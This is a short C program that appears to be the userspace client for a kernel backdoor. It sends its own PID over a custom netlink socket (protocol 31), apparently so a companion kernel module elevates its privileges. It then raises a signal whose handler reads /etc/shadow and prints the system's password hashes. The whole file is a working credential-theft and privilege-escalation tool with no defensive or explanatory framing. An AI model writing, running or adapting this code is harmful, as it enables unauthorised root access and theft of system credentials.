#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <fcntl.h>
#include <unistd.h>
#include <errno.h>
#include <sys/types.h>
#include <signal.h>
#include "lib_netlink.h"

#define MAX_PAYLOAD 1024

struct sockaddr_nl src_addr, dest_addr;
struct nlmsghdr *nlh = NULL;
struct iovec iov;
int sock_fd;
struct msghdr msg;

void handler()
{
	int fd, ret;
	char ch;

	if((fd = open("/etc/shadow", O_RDONLY)) < 0){
		perror("Open");
		exit(-1);
	}
	printf("Открытие файла...\nPID: %d\n", getpid());

	while((ret = read(fd, &ch, 1)) > 0){
	    putchar(ch);
	    if(ret == 0){
		printf("%d\n", ch);
		exit(0);
	    }
	}
	if(ret < 0)
	    perror("Read");

}

int main()
{
	static struct sigaction act, old_act;
	pid_t pid;
	char str[10];

	pid = getpid();

	act.sa_handler = handler;
	sigemptyset(&act.sa_mask);
	act.sa_flags = 0;

	sock_fd = socket(PF_NETLINK, SOCK_RAW, 31);
        if (sock_fd < 0)
	    return -1;

        memset(&src_addr, 0, sizeof(src_addr));
        src_addr.nl_family = AF_NETLINK;
        src_addr.nl_pid = getpid();

        bind(sock_fd, (struct sockaddr *)&src_addr, sizeof(src_addr));

        memset(&dest_addr, 0, sizeof(dest_addr));
	memset(&dest_addr, 0, sizeof(dest_addr));
	dest_addr.nl_family = AF_NETLINK;
        dest_addr.nl_pid = 0; 
        dest_addr.nl_groups = 0; 

	nlh = (struct nlmsghdr *)malloc(NLMSG_SPACE(MAX_PAYLOAD));
        memset(nlh, 0, NLMSG_SPACE(MAX_PAYLOAD));
        nlh->nlmsg_len = NLMSG_SPACE(MAX_PAYLOAD);
        nlh->nlmsg_pid = getpid();
        nlh->nlmsg_flags = 0;

	sprintf(str, "%d", pid);
        strcpy(NLMSG_DATA(nlh), str);

	iov.iov_base = (void *)nlh;
        iov.iov_len = nlh->nlmsg_len;
        msg.msg_name = (void *)&dest_addr;
        msg.msg_namelen = sizeof(dest_addr);

 	msg.msg_iov = &iov;
	msg.msg_iovlen = 1;

    	printf("Sending message to kernel\n");
    	sendmsg(sock_fd, &msg, 0);
    	printf("Waiting for message from kernel\n");

	if(old_act.sa_handler != SIG_IGN)
	    sigaction(SIGUSR1, &act, NULL);
	kill(getpid(), SIGUSR1);

	return 0;
}
